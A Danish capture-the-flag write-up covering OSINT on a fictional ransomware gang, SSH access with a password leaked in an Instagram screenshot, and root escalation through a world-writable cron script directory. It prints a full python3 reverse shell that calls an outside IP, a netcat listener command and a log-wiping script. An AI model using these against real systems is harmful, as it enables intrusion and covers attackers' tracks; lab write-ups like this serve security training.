# Writeup

`Nisseware: Infrastructure` er (som tydeliggjort i beskrivelsen) en fortsÃ¦ttelse af [Nisseware: OSINT](../nisseware-osint/),
og her er det vigtigt at lÃ¦gge mÃ¦rke til sidste del af beskrivelsen: "*fandt du det hele? ğŸ‘€*".

I OSINT-opgaven fandt vi frem til `HrM0rt3ns3n`s Twitter/X profil og derfra hans Mastodon.
Fra den fandt vi `n1ss3f4r`, som ogsÃ¥ havde en Mastodon.social profil, men vigtigere ledte denne til hans Infosec Exchange profil: https://infosec.exchange/@n1ss3f4r

Her er isÃ¦r det nyeste post relevant:

![Nissefars post om andre profiler](img/nissefar-infosec.png)

Her hintes til, at `n1ss3f4r` har profiler pÃ¥ andre medier, specifikt nogle af de Ã¦ldre end Mastodon, der jo stadig er relativt nyt.

En god start er at tjekke `WhatsMyName` igen og nu lave en sÃ¸gning pÃ¥ `n1ss3f4r`:

![WhatsMyName resultat for nissefar](img/whatsmyname-2.png)

Hmm, den finder dog kun `mastodon.social`, ikke engang `infosec.exchange`. Den finder ogsÃ¥ en Apex Legends gamingprofil, men den er unclaimed og nÃ¦sten tom - hÃ¸jest sandsynligt en falsk positiv.
Vi kan ogsÃ¥ forsÃ¸ge med `sherlock`, der dog heller ikke finder noget interessant. Andre tools kan ogsÃ¥ forsÃ¸ges, men ellers er det bare at gÃ¥ manuelt til vÃ¦rks, for de fleste tools vil have en del bÃ¥de falske positiver og negativer.

Det er altid en god idÃ© i OSINT challenges at prÃ¸ve kendte usernames af pÃ¥ de mest almindelige sociale netvÃ¦rk o.l. relevante sider som `Facebook`, `YouTube`, `Instagram`, `Twitter`, `GitHub`, `TikTok` osv. - lige her falder `TikTok` mÃ¥ske ikke helt inden for "gode gamle netvÃ¦rk", men det kunne de resterende sagtens, og disse bÃ¸r alle tjekkes manuelt.

GÃ¸res dette, vil man opdage, at `n1ss3f4r` har en Instagram konto: https://www.instagram.com/n1ss3f4r.

![Nissefars Instagram profil](img/nissefar-instagram-profil.png)

Han har faktisk en del interessante posts:

![Nissefars Instagram posts](img/instagram-posts.png)

men isÃ¦r Ã©t stikker tydeligt ud fra de resterende:

![Nissefars leak](img/nissefar-leak-full.png)

Zoomer vi mere ind ses, at der i venstre side af hans skÃ¦rm er et Visual Studio Code vindue Ã¥bent, hvor han sidder og udvikler pÃ¥ VBA koden fra [Nisseware: Phishing](../nisseware-phishing/).
Vigtigere til hÃ¸jre ses et terminalvindue samt en mail fra `HrM0rt3ns3n`:

![Nissefars terminal](img/insta-term.png)

![Nissefars mail](img/insta-mail.png)

I mailen stÃ¥r:

```
Godmorgen nissefar!

Jeg har som aftalt sat ny C2-server op, den burde vÃ¦re good to go.
Du kan forbinde via SSH til n1ss3b4nd3n.jul med dit normale handle og passwordet:
HyphypAlleMine9R3nsdyr!

Har smidt et par scripts pÃ¥ til automatisk fetch af nye ransom betalinger og til at wipe logs regelmÃ¦ssigt,
sÃ¥ du skal ikke vÃ¦re sÃ¥ nervÃ¸s for, hvordan du bruger maskinen.
Vi skal nÃ¸dig ende i samme situation som sidst, spÃ¦ndende hvornÃ¥r Sk1pp3r kommer ud igen...

/Hr. M0rt3ns3n
```

Fedt! Et tydeligt leak af bÃ¥de serveren `n1ss3b4nd3n.jul` og hans password `HyphypAlleMine9R3nsdyr!`.
I terminalen kan man se, at `n1ss3f4r` connecter med `ssh n1ss3f4r@n1ss3b4nd3n.jul` og kommer ind pÃ¥ serveren.

Nu kan vi infiltrere `N1ss3b4nd3n`s server og fÃ¥ adgang til `n1ss3f4r`s profil!
Serveren kÃ¸rer via Haaukins og krÃ¦ver, man lige connecter der med VPN eller browser kali, hvorefter vi kan logge ind med samme command og passwordet.

Her finder vi fÃ¸rste halvdel af flaget i `flag_user.txt`: `NC3{N1ss3b4nd3ns_53rv3r`

![Initial server access](img/server-initial-access.png)

Der ligger ogsÃ¥ VBA-scriptet og det ondsindede regneark fra [Nisseware: Phishing](../nisseware-phishing/) samt en `payloads/` mappe med tre af gruppens payloads, som ogsÃ¥ lÃ¥ i pastebin.
AltsÃ¥ kan man i princippet lÃ¸se [Nisseware: Loading](../nisseware-loading/) nu, hvis man tidligere fandt frem til pastebin og den offentlige bin med medlemslisten, men missede, at man kunne tilgÃ¥ GitHub repoet og commit history, der ellers ledte til scriptet med flag.

Sidst ligger i hjemmemappen fÃ¸lgende `todo.txt`:

```md
# TODO

- FÃ¸lg op pÃ¥ seneste angreb (LegetÃ¸j"Ğ¯"Os)
  - Monitorer overfÃ¸rsel af ransom
  - GennemgÃ¥ eksfiltrerede dokumenter med prototyper, sÃ¦t i produktion eller sÃ¦lg
- Forbedr script til monitorering af nye ransomoverfÃ¸rsler
- Husk tandlÃ¦getid
- Forbered nisserne pÃ¥ ny fyringsrunde
- Find nye targets i legetÃ¸jsbranchen
- Tjek op pÃ¥ serverens sikkerhed, bÃ¸r muligvis hÃ¦rdes lidt
```

Meget tydeligt tegn pÃ¥, de stÃ¥r bag det efterforskede angreb og lidt hints til, hvad de mon eksfiltrerede, hvis man ikke har lÃ¸st [Nisseware: Exfiltration](../nisseware-exfiltration/) endnu.
Samtidig virker der til at vÃ¦re noget monitoreringsscript og mÃ¥ske nogle sikkerhedshuller pÃ¥ serveren.

Tid til enumeration! En hurtig `ls /` viser, at der ligger en mappe, der ikke plejer:

```console
$ ls /
bin  boot  data  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

nemlig `data` - lad os lige se, hvad den indeholder:

```console
$ ls /data/
payments.txt
```

```console
$ cat payments.txt 
2023-11-27 13:45:01+00:00
cc9a47154a1e7dbdf20e5909edeec089:  16.33 ETH

2023-11-27 21:25:01+00:00
8a24d712e90da50022256b9c455e7c23:  18.36 ETH

2023-11-28 15:40:01+00:00
6cf760aab7ed41e5bded1bc939da7bab:  3.48 ETH

2023-11-28 18:05:01+00:00
75b76a16a8f053e0b93048dcc35724ec:  11.02 ETH
79a7cbf05bb959a956a654424eca0114:  26.64 ETH

2023-11-29 08:50:01+00:00
26f3b9e0337b3dee58f8c3441854f7b2:  30.98 ETH

2023-11-30 09:15:01+00:00
fde4f5eb29cc1fa313dd4add2e39bd8f:  4.26 ETH
1920316f574bbce48891b3556cdae767:  19.72 ETH

2023-11-30 12:30:01+00:00
a4f7de91cbc3b70eb500b74ba093369f:  12.37 ETH
```

Hmm, det virker som indgÃ¥ende betalinger, sandsynligvis lÃ¸sesummer fra deres angreb, mÃ¥ske det er dem, der hentes ned med det nÃ¦vnte monitoreringsscript?

En god enumerationtaktik er lige at fÃ¥ afprÃ¸vet et script som [linpeas.sh](https://linpeas.sh/), der tjekker for de mest almindelige ting.
Man kan dog ogsÃ¥ gÃ¥ manuelt til vÃ¦rks, da det ikke er en svÃ¦r boot2root maskine.
Der er `sudo` pÃ¥ maskinen, men `n1ss3f4r` har ikke `sudo`-rettigheder.
Tjekker vi kÃ¸rende processer med `top`, kan vi se, at der fx kÃ¸rer `cron` - ret interessant og vÃ¦rd at udforske yderligere, isÃ¦r fordi den kÃ¸rer som `root`!
Derfor er der heller intet `crontab` for `n1ss3f4r` (kan tjekkes med `crontab -l`), men vi kan kigge i `/etc` og se, om der ligger noget brugbart:

```console
$ ls /etc/cron.d
e2scrub_all  run_scripts
```

`e2scrub_all` er standard og tjekker bare for problemer i logiske volumes, men `run_scripts` ser custom og interessant ud!

```console
$ cat /etc/cron.d/run_scripts 
*/5 * * * * root /bin/bash /root/run_all.sh /usr/scheduled
```

Okay, sÃ¥ hvert 5. minut kÃ¸res `/root/run_all.sh /usr/scheduled` som `root`, det skal klart udforskes.
Vi har ikke rettigheder til at kigge i `/root`, men navnet tyder jo pÃ¥, at scriptet bare kÃ¸rer alle scripts i `/usr/scheduled`, sÃ¥ vi tager et kig her:

```konsole
$ ls -la /usr/scheduled/
total 16
drwxrwxrwx 1 root root 4096 Nov 29 11:20 .
drwxr-xr-x 1 root root 4096 Nov 29 11:20 ..
-rwx------ 1 root root  110 Nov 29 11:19 delete_logs.sh
-rwx------ 1 root root  594 Nov 29 11:19 fetch_new_payments.sh
```

`delete_logs.sh` er nok et script til at slette relevante logs hvert 5. minut, og `fetch_new_payments.sh` henter nok nye lÃ¸sesumsbetalinger ind i `/data/payments.txt`.
Vi kan ikke verificere disse hypoteser, da begge scripts kun er lÃ¦sbare af `root`, men vi kan mÃ¥ske fÃ¥ lov at kÃ¸re vores eget script! Og mon ikke det sÃ¥ kÃ¸rer som `root`?

Serveren har `python3` installeret, sÃ¥ vi kan sÃ¦tte en lokal netcat listener op pÃ¥ vores egen maskine med `nc -lvnp 4000` og finde en standard `python3` reverse shell.
Man kan starte med at prÃ¸ve den af direkte som command og tjekke, man fÃ¥r en shell som `n1ss3f4r`, og herefter kan den indsÃ¦ttes i fx `/usr/scheduled/shell.sh`:

```bash
#!/bin/bash
export RHOST="25.130.240.253"
export RPORT=4000
python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

Der er ikke `nano` pÃ¥ maskinen, men man kan bruge `vim` eller bare redirecte det ind med `echo`.
Herefter er det bare at vente i max 5 minutter, og sÃ¥ er der `root` shell!

![Root shell](img/root-shell.png)

Her ser vi bl.a. `flag_root.txt`, som indeholder anden og sidste del af flaget: `_1nf1ltr3r3t_g00d_j0b!}`.
De kan samles til `NC3{N1ss3b4nd3ns_53rv3r_1nf1ltr3r3t_g00d_j0b!}`, og vi har nu lÃ¸st opgaven og skaffet fuld access til `N1ss3b4nd3n`s server!

Du er nÃ¥et til Ã©n af seriens primÃ¦re end goals: disruption af gruppen og takedown af deres server. Har du endnu ikke analyseret C2-trafikken og/eller ransomwaren, kan du fortsÃ¦tte med end goalet "dekryptering" fra og med [Nisseware: Exfiltration](../nisseware-exfiltration/) eller mÃ¥ske gÃ¥ ad kryptovejen i [Nisseware: Ransom](../nisseware-ransom/).

## Bonus!

Du har fÃ¥et fuld adgang til serveren, sÃ¥ hvorfor ikke lige se, hvad vi ellers har adgang til nu?
Der ligger en `c2/` mappe og en `nisseware/` mappe i `/root/` med en rÃ¦kke af gruppens filer!
`c2/` indeholder som easter egg serverkoden for `c2`-frameworket, hvor man ellers kun har kunne se klienten i netvÃ¦rkstrafikken.
Herudover ligger `c2/uploads`, hvor det tydeligt ses, at `N1ss3b4nd3n` har eksfiltreret filer fra legetÃ¸jsfirmaet - desvÃ¦rre ikke den med flaget fra [Nisseware: Exfiltration](../nisseware-exfiltration/), den har de Ã¥benbart slettet igen ;)

I `nisseware/` mappen ligger den faktiske ransomware! Nemlig filen `AntiVirusInstaller.exe` samt ransom noten `instructions.hta`.
Denne ransomware er ellers sendt krypteret af C2-serveren og krÃ¦ver, man lÃ¸ser [Nisseware: Exfiltration](../nisseware-exfiltration/), sÃ¥ den kan dekrypteres,
men nÃ¥r man helt hertil fÃ¸rst, er altsÃ¥ givet en alternativ genvej ind i [Nisseware: Dropper](../nisseware-dropper/), hvor man kan springe noget reversing og crypto over.

Til de nysgerrige kan vi nu ogsÃ¥ lÃ¦se `run_all.sh`:

```sh
#!/bin/bash
for file in $1/*
do
    /bin/bash "$file"
done
```

samt de to scripts i `/usr/scheduled`, fÃ¸rst `delete_logs.sh`:

```sh
#!/bin/bash
truncate -s 0 /root/.bash_history
truncate -s 0 /home/*/.bash_history
truncate -s 0 /var/log/*log
```

og sÃ¥ `fetch_new_payments.sh`, hvor der muligvis er snydt lidt og bare simuleret nye overfÃ¸rsler til `payments.txt`:

```sh
#!/bin/bash

# Vent, sÃ¥ payment scriptet var bare simuleret, det hele er fake???
# ğ˜ˆğ˜­ğ˜¸ğ˜¢ğ˜ºğ˜´ ğ˜©ğ˜¢ğ˜´ ğ˜£ğ˜¦ğ˜¦ğ˜¯
# ğŸŒ  ğŸ‘¨â€ğŸš€ğŸ‘¨â€ğŸš€
r=$(shuf -i 0-10 -n 1)
if [ $r -gt 9 ]
then
    count=2
elif [ $r -gt 6 ]
then
    count=1
else
    count=0
fi

if [ $count -gt 0 ]
then
    date -u --rfc-3339=seconds >> /data/payments.txt
fi

for i in $(seq $count)
do
    echo "$(date -u --rfc-3339=ns | md5sum | awk '{print $1}'):  $((1 + RANDOM % 20)).$((RANDOM % 100)) ETH" >> /data/payments.txt
done

if [ $count -gt 0 ]
then
    echo "" >> /data/payments.txt
fi
```

SÃ¥ er der vist heller ikke flere easter eggs at hente i den opgave :)

Til dem, der ikke fandt Instagram kontoen og/eller var interesseret i at oprette en profil, kan man se alle `n1ss3f4rs` fine posts her:

![Nissefars Instagram post 1](img/insta-1.png)

![Nissefars Instagram post 2](img/insta-2.png)

![Nissefars Instagram post 3](img/insta-3.png)

![Nissefars Instagram post 4](img/insta-4.png)

![Nissefars Instagram post 5](img/insta-5.png)

![Nissefars Instagram post 6](img/insta-6.png)

![Nissefars Instagram post 7](img/insta-7.png)

![Nissefars Instagram post 8](img/insta-8.png)

![Nissefars Instagram post 9](img/insta-9.png)

![Nissefars Instagram post 10](img/insta-10.png)

![Nissefars Instagram post 11](img/insta-11.png)

![Nissefars Instagram post 12](img/insta-12.png)

**Flag**

`NC3{N1ss3b4nd3ns_53rv3r_1nf1ltr3r3t_g00d_j0b!}`
